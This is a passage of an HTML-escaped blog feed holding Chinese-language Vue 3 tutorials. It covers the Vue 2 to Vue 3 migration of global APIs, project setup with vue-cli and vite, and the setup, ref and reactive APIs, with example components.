&#123;&#123; count &#125;&#125; times.&lt;/button&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册全局指令</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;focus&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">inserted</span>: <span class="function"><span class="params">el</span> =&gt;</span> el.<span class="title function_">focus</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Vue3.0中对这些API做出了调整：</p><ul><li><p>将全局的API，即：<code>Vue.xxx</code>调整到应用实例（<code>app</code>）上</p><table><thead><tr><th>2.x 全局 API（<code>Vue</code>）</th><th>3.x 实例 API (<code>app</code>)</th></tr></thead><tbody><tr><td>Vue.config.xxxx</td><td>app.config.xxxx</td></tr><tr><td>Vue.config.productionTip</td><td><strong style="color:#DD5145">移除</strong></td></tr><tr><td>Vue.component</td><td>app.component</td></tr><tr><td>Vue.directive</td><td>app.directive</td></tr><tr><td>Vue.mixin</td><td>app.mixin</td></tr><tr><td>Vue.use</td><td>app.use</td></tr><tr><td>Vue.prototype</td><td>app.config.globalProperties</td></tr></tbody></table></li></ul></li></ul><h2 id="其他改变"><a href="#其他改变" class="headerlink" title="其他改变"></a>其他改变</h2><ul><li><p>data选项应始终被声明为一个函数。</p></li><li><p>过度类名的更改：</p><ul><li><p>Vue2.x写法</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.v-enter</span>,</span><br><span class="line"><span class="selector-class">.v-leave-to</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.v-leave</span>,</span><br><span class="line"><span class="selector-class">.v-enter-to</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Vue3.x写法</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.v-enter-from</span>,</span><br><span class="line"><span class="selector-class">.v-leave-to</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.v-leave-from</span>,</span><br><span class="line"><span class="selector-class">.v-enter-to</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持<code>config.keyCodes</code></p></li><li><p><strong style="color:#DD5145">移除</strong><code>v-on.native</code>修饰符</p><ul><li><p>父组件中绑定事件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;my-component</span><br><span class="line">  v-on:close=&quot;handleComponentEvent&quot;</span><br><span class="line">  v-on:click=&quot;handleNativeClickEvent&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure></li><li><p>子组件中声明自定义事件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    emits: [&#x27;close&#x27;]</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong style="color:#DD5145">移除</strong>过滤器（filter）</p><blockquote><p>过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3+TypeScript</title>
      <link href="/2023/10/07/vue3+TypeScript/"/>
      <url>/2023/10/07/vue3+TypeScript/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Vue3简介"><a href="#1-Vue3简介" class="headerlink" title="1. Vue3简介"></a>1. Vue3简介</h1><ul><li><p>2020年9月18日，<code>Vue.js</code>发布版<code>3.0</code>版本，代号：<code>One Piece</code>（n</p></li><li><p>经历了：<a href="https://github.com/vuejs/core/commits/main">4800+次提交</a>、<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs">40+个RFC</a>、<a href="https://github.com/vuejs/vue-next/pulls?q=is:pr+is:merged+-author:app/dependabot-preview+">600+次PR</a>、<a href="https://github.com/vuejs/core/graphs/contributors">300+贡献者</a></p></li><li><p>官方发版地址：<a href="https://github.com/vuejs/core/releases/tag/v3.0.0">Release v3.0.0 One Piece · vuejs/core</a></p></li><li><p>截止2023年10月，最新的公开版本为：<code>3.3.4</code></p><img src="images/1695089947298-161c1b47-eb86-42fb-b1f8-d6a4fcab8ee2.png" alt="image.png" style="zoom:30%;" /> </li></ul><h2 id="1-1-【性能的提升】"><a href="#1-1-【性能的提升】" class="headerlink" title="1.1. 【性能的提升】"></a>1.1. 【性能的提升】</h2><ul><li><p>打包大小减少<code>41%</code>。</p></li><li><p>初次渲染快<code>55%</code>, 更新渲染快<code>133%</code>。</p></li><li><p>内存减少<code>54%</code>。</p></li></ul><h2 id="1-2-【-源码的升级】"><a href="#1-2-【-源码的升级】" class="headerlink" title="1.2.【 源码的升级】"></a>1.2.【 源码的升级】</h2><ul><li><p>使用<code>Proxy</code>代替<code>defineProperty</code>实现响应式。</p></li><li><p>重写虚拟<code>DOM</code>的实现和<code>Tree-Shaking</code>。</p></li></ul><h2 id="1-3-【拥抱TypeScript】"><a href="#1-3-【拥抱TypeScript】" class="headerlink" title="1.3. 【拥抱TypeScript】"></a>1.3. 【拥抱TypeScript】</h2><ul><li><code>Vue3</code>可以更好的支持<code>TypeScript</code>。</li></ul><h2 id="1-4-【新的特性】"><a href="#1-4-【新的特性】" class="headerlink" title="1.4. 【新的特性】"></a>1.4. 【新的特性】</h2><ol><li><p><code>Composition API</code>（组合<code>API</code>）：</p><ul><li><p><code>setup</code></p></li><li><p><code>ref</code>与<code>reactive</code></p></li><li><p><code>computed</code>与<code>watch</code></p><p>……</p></li></ul></li><li><p>新的内置组件：</p><ul><li><p><code>Fragment</code></p></li><li><p><code>Teleport</code></p></li><li><p><code>Suspense</code></p><p>……</p></li></ul></li><li><p>其他改变：</p><ul><li><p>新的生命周期钩子</p></li><li><p><code>data</code> 选项应始终被声明为一个函数</p></li><li><p>移除<code>keyCode</code>支持作为<code> v-on</code> 的修饰符</p><p>……</p></li></ul></li></ol><h1 id="2-创建Vue3工程"><a href="#2-创建Vue3工程" class="headerlink" title="2. 创建Vue3工程"></a>2. 创建Vue3工程</h1><h2 id="2-1-【基于-vue-cli-创建】"><a href="#2-1-【基于-vue-cli-创建】" class="headerlink" title="2.1. 【基于 vue-cli 创建】"></a>2.1. 【基于 vue-cli 创建】</h2><p>点击查看<a href="https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create">官方文档</a></p><blockquote><p>备注：目前<code>vue-cli</code>已处于维护模式，官方推荐基于 <code>Vite</code> 创建项目。</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上</span></span><br><span class="line">vue <span class="literal">--version</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装或者升级你的@vue/cli </span></span><br><span class="line">npm install <span class="literal">-g</span> @vue/<span class="built_in">cli</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 执行创建命令</span></span><br><span class="line">vue create vue_test</span><br><span class="line"></span><br><span class="line"><span class="comment">##  随后选择3.x</span></span><br><span class="line"><span class="comment">##  Choose a version of Vue.js that you want to start the project with (Use arrow keys)</span></span><br><span class="line"><span class="comment">##  &gt; 3.x</span></span><br><span class="line"><span class="comment">##    2.x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动</span></span><br><span class="line"><span class="built_in">cd</span> vue_test</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure><hr><h2 id="2-2-【基于-vite-创建】-推荐"><a href="#2-2-【基于-vite-创建】-推荐" class="headerlink" title="2.2. 【基于 vite 创建】(推荐)"></a>2.2. 【基于 vite 创建】(推荐)</h2><p><code>vite</code> 是新一代前端构建工具，官网地址：<a href="https://vitejs.cn/">https://vitejs.cn</a>，<code>vite</code>的优势如下：</p><ul><li>轻量快速的热重载（<code>HMR</code>），能实现极速的服务启动。</li><li>对 <code>TypeScript</code>、<code>JSX</code>、<code>CSS</code> 等支持开箱即用。</li><li>真正的按需编译，不再等待整个应用编译完成。</li><li><code>webpack</code>构建 与 <code>vite</code>构建对比图如下：<br><img src="images/1683167182037-71c78210-8217-4e7d-9a83-e463035efbbe.png" alt="webpack构建" title="webpack构建" style="zoom:20%;box-shadow:0 0 10px black" />    <img src="images/1683167204081-582dc237-72bc-499e-9589-2cdfd452e62f.png" alt="vite构建" title="vite构建" style="zoom: 20%;box-shadow:0 0 10px black" /></li></ul><ul><li>具体操作如下（点击查看<a href="https://cn.vuejs.org/guide/quick-start.html#creating-a-vue-application">官方文档</a>）</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 1.创建命令</span></span><br><span class="line">npm create vue@latest</span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.具体配置</span></span><br><span class="line"><span class="comment">## 配置项目名称</span></span><br><span class="line">√ Project name: vue3_test</span><br><span class="line"><span class="comment">## 是否添加TypeScript支持</span></span><br><span class="line">√ Add TypeScript?  Yes</span><br><span class="line"><span class="comment">## 是否添加JSX支持</span></span><br><span class="line">√ Add JSX Support?  No</span><br><span class="line"><span class="comment">## 是否添加路由环境</span></span><br><span class="line">√ Add Vue Router <span class="keyword">for</span> Single Page Application development?  No</span><br><span class="line"><span class="comment">## 是否添加pinia环境</span></span><br><span class="line">√ Add Pinia <span class="keyword">for</span> state management?  No</span><br><span class="line"><span class="comment">## 是否添加单元测试</span></span><br><span class="line">√ Add Vitest <span class="keyword">for</span> Unit Testing?  No</span><br><span class="line"><span class="comment">## 是否添加端到端测试方案</span></span><br><span class="line">√ Add an <span class="keyword">End</span><span class="literal">-to-End</span> Testing Solution? » No</span><br><span class="line"><span class="comment">## 是否添加ESLint语法检查</span></span><br><span class="line">√ Add ESLint <span class="keyword">for</span> code quality?  Yes</span><br><span class="line"><span class="comment">## 是否添加Prettiert代码格式化</span></span><br><span class="line">√ Add Prettier <span class="keyword">for</span> code formatting?  No</span><br></pre></td></tr></table></figure><p>自己动手编写一个App组件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;h1&gt;你好啊！&lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;App&#x27; //组件名</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .app &#123;</span><br><span class="line">    background-color: #ddd;</span><br><span class="line">    box-shadow: 0 0 10px;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">    padding: 20px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>安装官方推荐的<code>vscode</code>插件：</p><img src="images/volar.png" alt="Snipaste_2023-10-08_20-46-34" style="zoom:50%;" /> <img src="images/image-20231218085906380.png" alt="image-20231218085906380" style="zoom:42%;" /> <p>总结：</p><ul><li><code>Vite</code> 项目中，<code>index.html</code> 是项目的入口文件，在项目最外层。</li><li>加载<code>index.html</code>后，<code>Vite</code> 解析 <code>&lt;script type=&quot;module&quot; src=&quot;xxx&quot;&gt;</code> 指向的<code>JavaScript</code>。</li><li><code>Vue3</code>**中是通过 **<code>createApp</code> 函数创建一个应用实例。<h2 id="2-3-【一个简单的效果】"><a href="#2-3-【一个简单的效果】" class="headerlink" title="2.3. 【一个简单的效果】"></a>2.3. 【一个简单的效果】</h2></li></ul><p><code>Vue3</code>向下兼容<code>Vue2</code>语法，且<code>Vue3</code>中的模板中可以没有根标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;App&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        name:&#x27;张三&#x27;,</span><br><span class="line">        age:18,</span><br><span class="line">        tel:&#x27;13888888888&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      changeName()&#123;</span><br><span class="line">        this.name = &#x27;zhang-san&#x27;</span><br><span class="line">      &#125;,</span><br><span class="line">      changeAge()&#123;</span><br><span class="line">        this.age += 1</span><br><span class="line">      &#125;,</span><br><span class="line">      showTel()&#123;</span><br><span class="line">        alert(this.tel)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="3-Vue3核心语法"><a href="#3-Vue3核心语法" class="headerlink" title="3. Vue3核心语法"></a>3. Vue3核心语法</h1><h2 id="3-1-【OptionsAPI-与-CompositionAPI】"><a href="#3-1-【OptionsAPI-与-CompositionAPI】" class="headerlink" title="3.1.  【OptionsAPI 与 CompositionAPI】"></a>3.1.  【OptionsAPI 与 CompositionAPI】</h2><ul><li><code>Vue2</code>的<code>API</code>设计是<code>Options</code>（配置）风格的。</li><li><code>Vue3</code>的<code>API</code>设计是<code>Composition</code>（组合）风格的。<h3 id="Options-API-的弊端"><a href="#Options-API-的弊端" class="headerlink" title="Options API 的弊端"></a>Options API 的弊端</h3></li></ul><p><code>Options</code>类型的 <code>API</code>，数据、方法、计算属性等，是分散在：<code>data</code>、<code>methods</code>、<code>computed</code>中的，若想新增或者修改一个需求，就需要分别修改：<code>data</code>、<code>methods</code>、<code>computed</code>，不便于维护和复用。</p><p><img src="images/1696662197101-55d2b251-f6e5-47f4-b3f1-d8531bbf9279.gif" alt="1.gif" style="zoom:70%;border-radius:20px" /><img src="images/1696662200734-1bad8249-d7a2-423e-a3c3-ab4c110628be.gif" alt="2.gif" style="zoom:70%;border-radius:20px" /></p><h3 id="Composition-API-的优势"><a href="#Composition-API-的优势" class="headerlink" title="Composition API 的优势"></a>Composition API 的优势</h3><p>可以用函数的方式，更加优雅的组织代码，让相关功能的代码更加有序的组织在一起。</p><p><img src="images/1696662249851-db6403a1-acb5-481a-88e0-e1e34d2ef53a.gif" alt="3.gif" style="height:300px;border-radius:10px"  /><img src="images/1696662256560-7239b9f9-a770-43c1-9386-6cc12ef1e9c0.gif" alt="4.gif" style="height:300px;border-radius:10px"  /></p><blockquote><p>说明：以上四张动图原创作者：大帅老猿</p></blockquote><h2 id="3-2-【拉开序幕的-setup】"><a href="#3-2-【拉开序幕的-setup】" class="headerlink" title="3.2. 【拉开序幕的 setup】"></a>3.2. 【拉开序幕的 setup】</h2><h3 id="setup-概述"><a href="#setup-概述" class="headerlink" title="setup 概述"></a>setup 概述</h3><p><code>setup</code>是<code>Vue3</code>中一个新的配置项，值是一个函数，它是 <code>Composition API</code> <strong>“表演的舞台</strong>_<strong>”</strong>_，组件中所用到的：数据、方法、计算属性、监视……等等，均配置在<code>setup</code>中。</p><p>特点如下：</p><ul><li><p><code>setup</code>函数返回的对象中的内容，可直接在模板中使用。</p></li><li><p><code>setup</code>中访问<code>this</code>是<code>undefined</code>。</p></li><li><p><code>setup</code>函数会在<code>beforeCreate</code>之前调用，它是“领先”所有钩子执行的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;Person&#x27;,</span><br><span class="line">    setup()&#123;</span><br><span class="line">      // 数据，原来写在data中（注意：此时的name、age、tel数据都不是响应式数据）</span><br><span class="line">      let name = &#x27;张三&#x27;</span><br><span class="line">      let age = 18</span><br><span class="line">      let tel = &#x27;13888888888&#x27;</span><br><span class="line"></span><br><span class="line">      // 方法，原来写在methods中</span><br><span class="line">      function changeName()&#123;</span><br><span class="line">        name = &#x27;zhang-san&#x27; //注意：此时这么修改name页面是不变化的</span><br><span class="line">        console.log(name)</span><br><span class="line">      &#125;</span><br><span class="line">      function changeAge()&#123;</span><br><span class="line">        age += 1 //注意：此时这么修改age页面是不变化的</span><br><span class="line">        console.log(age)</span><br><span class="line">      &#125;</span><br><span class="line">      function showTel()&#123;</span><br><span class="line">        alert(tel)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 返回一个对象，对象中的内容，模板中可以直接使用</span><br><span class="line">      return &#123;name,age,tel,changeName,changeAge,showTel&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="setup-的返回值"><a href="#setup-的返回值" class="headerlink" title="setup 的返回值"></a>setup 的返回值</h3></li><li><p>若返回一个<strong>对象</strong>：则对象中的：属性、方法等，在模板中均可以直接使用<strong>（重点关注）。</strong></p></li><li><p>若返回一个<strong>函数</strong>：则可以自定义渲染内容，代码如下：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">()=&gt;</span> <span class="string">&#x27;你好啊！&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="setup-与-Options-API-的关系"><a href="#setup-与-Options-API-的关系" class="headerlink" title="setup 与 Options API 的关系"></a>setup 与 Options API 的关系</h3></li><li><p><code>Vue2</code> 的配置（<code>data</code>、<code>methos</code>……）中<strong>可以访问到</strong> <code>setup</code>中的属性、方法。</p></li><li><p>但在<code>setup</code>中<strong>不能访问到</strong><code>Vue2</code>的配置（<code>data</code>、<code>methos</code>……）。</p></li><li><p>如果与<code>Vue2</code>冲突，则<code>setup</code>优先。</p><h3 id="setup-语法糖"><a href="#setup-语法糖" class="headerlink" title="setup 语法糖"></a>setup 语法糖</h3><p><code>setup</code>函数有一个语法糖，这个语法糖，可以让我们把<code>setup</code>独立出去，代码如下：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;Person&#x27;,</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 下面的写法是setup语法糖 --&gt;</span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">  console.log(this) //undefined</span><br><span class="line">  </span><br><span class="line">  // 数据（注意：此时的name、age、tel都不是响应式数据）</span><br><span class="line">  let name = &#x27;张三&#x27;</span><br><span class="line">  let age = 18</span><br><span class="line">  let tel = &#x27;13888888888&#x27;</span><br><span class="line"></span><br><span class="line">  // 方法</span><br><span class="line">  function changName()&#123;</span><br><span class="line">    name = &#x27;李四&#x27;//注意：此时这么修改name页面是不变化的</span><br><span class="line">  &#125;</span><br><span class="line">  function changAge()&#123;</span><br><span class="line">    console.log(age)</span><br><span class="line">    age += 1 //注意：此时这么修改age页面是不变化的</span><br><span class="line">  &#125;</span><br><span class="line">  function showTel()&#123;</span><br><span class="line">    alert(tel)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>扩展：上述代码，还需要编写一个不写<code>setup</code>的<code>script</code>标签，去指定组件名字，比较麻烦，我们可以借助<code>vite</code>中的插件简化</p><ol><li><p>第一步：<code>npm i vite-plugin-vue-setup-extend -D</code></p></li><li><p>第二步：<code>vite.config.ts</code></p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueSetupExtend</span> <span class="keyword">from</span> <span class="string">&#x27;vite-plugin-vue-setup-extend&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [ <span class="title class_">VueSetupExtend</span>() ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>第三步：<code>&lt;script setup lang=&quot;ts&quot; name=&quot;Person&quot;&gt;</code></p><h2 id="3-3-【ref-创建：基本类型的响应式数据】"><a href="#3-3-【ref-创建：基本类型的响应式数据】" class="headerlink" title="3.3. 【ref 创建：基本类型的响应式数据】"></a>3.3. 【ref 创建：基本类型的响应式数据】</h2></li></ol><ul><li><p><strong>作用：</strong>定义响应式变量。</p></li><li><p><strong>语法：</strong><code>let xxx = ref(初始值)</code>。</p></li><li><p><strong>返回值：</strong>一个<code>RefImpl</code>的实例对象，简称<code>ref对象</code>或<code>ref</code>，<code>ref</code>对象的<code>value</code><strong>属性是响应式的</strong>。</p></li><li><p><strong>注意点：</strong></p><ul><li><code>JS</code>中操作数据需要：<code>xxx.value</code>，但模板中不需要<code>.value</code>，直接使用即可。</li><li>对于<code>let name = ref(&#39;张三&#39;)</code>来说，<code>name</code>不是响应式的，<code>name.value</code>是响应式的。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">  // name和age是一个RefImpl的实例对象，简称ref对象，它们的value属性是响应式的。</span><br><span class="line">  let name = ref(&#x27;张三&#x27;)</span><br><span class="line">  let age = ref(18)</span><br><span class="line">  // tel就是一个普通的字符串，不是响应式的</span><br><span class="line">  let tel = &#x27;13888888888&#x27;</span><br><span class="line"></span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    // JS中操作ref对象时候需要.value</span><br><span class="line">    name.value = &#x27;李四&#x27;</span><br><span class="line">    console.log(name.value)</span><br><span class="line"></span><br><span class="line">    // 注意：name不是响应式的，name.value是响应式的，所以如下代码并不会引起页面的更新。</span><br><span class="line">    // name = ref(&#x27;zhang-san&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    // JS中操作ref对象时候需要.value</span><br><span class="line">    age.value += 1 </span><br><span class="line">    console.log(age.value)</span><br><span class="line">  &#125;</span><br><span class="line">  function showTel()&#123;</span><br><span class="line">    alert(tel)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-4-【reactive-创建：对象类型的响应式数据】"><a href="#3-4-【reactive-创建：对象类型的响应式数据】" class="headerlink" title="3.4. 【reactive 创建：对象类型的响应式数据】"></a>3.4. 【reactive 创建：对象类型的响应式数据】</h2></li></ul></li><li><p><strong>作用：</strong>定义一个<strong>响应式对象</strong>（基本类型不要用它，要用<code>ref</code>，否则报错）</p></li><li><p><strong>语法：</strong><code>let 响应式对象= reactive(源对象)</code>。</p></li><li><p><strong>返回值：</strong>一个<code>Proxy</code>的实例对象，简称：响应式对象。</p></li><li><p><strong>注意点：</strong><code>reactive</code>定义的响应式数据是“深层次”的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;汽车信息：一台&#123;&#123; car.brand &#125;&#125;汽车，价值&#123;&#123; car.price &#125;&#125;万&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;游戏列表：&lt;/h2&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;h2&gt;测试：&#123;&#123;obj.a.b.c.d&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCarPrice&quot;&gt;修改汽车价格&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeFirstGame&quot;&gt;修改第一游戏&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;test&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 数据</span><br><span class="line">let car = reactive(&#123; brand: &#x27;奔驰&#x27;, price: 100 &#125;)</span><br><span class="line">let games = reactive([</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa01&#x27;, name: &#x27;英雄联盟&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa02&#x27;, name: &#x27;王者荣耀&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa03&#x27;, name: &#x27;原神&#x27; &#125;</span><br><span class="line">])</span><br><span class="line">let obj = reactive(&#123;</span><br><span class="line">  a:&#123;</span><br><span class="line">    b:&#123;</span><br><span class="line">      c:&#123;</span><br><span class="line">        d:666</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">function changeCarPrice() &#123;</span><br><span class="line">  car.price += 10</span><br><span class="line">&#125;</span><br><span class="line">function changeFirstGame() &#123;</span><br><span class="line">  games[0].name = &#x27;流星蝴蝶剑&#x27;</span><br><span class="line">&#125;</span><br><span class="line">function test()&#123;</span><br><span class="line">  obj.a.b.c.d = 999</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-5-【ref-创建：对象类型的响应式数据】"><a href="#3-5-【ref-创建：对象类型的响应式数据】" class="headerlink" title="3.5. 【ref 创建：对象类型的响应式数据】"></a>3.5. 【ref 创建：对象类型的响应式数据】</h2></li><li><p>其实<code>ref</code>接收的数据可以是：<strong>基本类型</strong>、<strong>对象类型</strong>。</p></li><li><p>若<code>ref</code>接收的是对象类型，内部其实也是调用了<code>reactive</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    